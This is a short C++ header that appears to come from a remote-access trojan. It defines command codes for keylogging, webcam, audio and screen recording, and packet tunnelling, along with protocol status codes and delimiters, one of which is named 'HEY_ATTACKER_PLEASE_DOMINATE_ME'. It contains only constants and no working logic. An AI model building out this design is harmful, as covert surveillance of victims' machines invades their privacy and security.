#ifndef COMMON_HPP
#define COMMON_HPP

#include <cstdint>
#include <limits.h>

typedef uint8_t CommandCode;
typedef uint16_t Status;

enum : CommandCode {
    TEST            = 0b00000001,
    KILL            = 0b00000010,
    KEYLOGGER       = 0b00000100,
    WEBCAM_RECORDER = 0b00001000,
    AUDIO_RECORDER  = 0b00010000,
    SCREEN_RECORDER = 0b00100000,
    PACKET_TUNNEL   = 0b01000000,
};

enum : Status {
    ACCEPTED_OFFER                  = 0x100,
    REJECTED_OFFER                  = 0x101,
    EXEC_SUCCESS                    = 0x102,
    EXEC_ERROR                      = 0x103,
    PERMISSION_ERROR                = 0X104,
    HEY_ATTACKER_PLEASE_DOMINATE_ME = 0X105,
    UDP_ACK                         = 0X106
};

#define END_KEY "$^_end"
#define END_KEY_LEN (sizeof(END_KEY) - 1)

#define OUT_KEY "$^_out"
#define OUT_KEY_LEN (sizeof(OUT_KEY) - 1)
#define STATUS_SIZE sizeof(Status)
#define OUT_SIZE (OUT_KEY_LEN + STATUS_SIZE)

#define TCP_BASED SOCK_STREAM
#define UDP_BASED SOCK_DGRAM
#define MAX_FILE_NAME PATH_MAX

#define TUNNEL_NUMS 5

#define BUFFER_SIZE 4096

#endif // COMMON_HPP